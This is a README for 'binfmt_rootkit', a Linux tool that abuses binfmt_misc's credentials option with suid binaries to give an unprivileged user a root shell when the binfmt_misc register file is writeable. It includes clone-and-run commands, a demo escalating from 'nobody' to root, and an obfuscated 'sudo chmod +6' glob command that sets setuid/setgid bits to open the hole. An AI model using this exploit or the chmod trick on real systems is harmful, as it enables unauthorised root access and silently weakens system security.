
###########
binfmt_misc
###########

Kernel Support for miscellaneous (your favourite) exploits

No breakthrough here, just some trivia involving binary formats.

binfmt_rootkit
--------------

Poor man's rootkit, leverage `binfmt_misc`__'s credentials_ option to
escalate privilege through any suid binary (and to get a root shell) if
:literal:`/proc/sys/fs/binfmt_misc/register` is writeable.

__ https://github.com/torvalds/linux/raw/master/Documentation/admin-guide/binfmt-misc.rst
.. _credentials: https://github.com/torvalds/linux/blame/3bdb5971ffc6e87362787c770353eb3e54b7af30/Documentation/binfmt_misc.txt#L62


.. code:: bash

    $ git clone https://github.com/plcp/binfmt_misc
    $ cd binfmt_misc
    $ ./binfmt_rootkit --help

    Usage: ./binfmt_rootkit
        Get you a root shell if /proc/sys/fs/binfmt_misc/register is writeable.
        (note that it must be enforced by other means before using the script,
        like by typing the poor man's rootkit: 'sudo chmod +6 /*/*/f*/*/*r')

Cheap nobody to root is cheap:

.. code:: bash

    $ sudo -u nobody ./binfmt_rootkit
    uid=0(root) euid=0(root)
    sh-4.4#

Tested on :literal:`Linux 4.9.6-1` and working with major distributions.
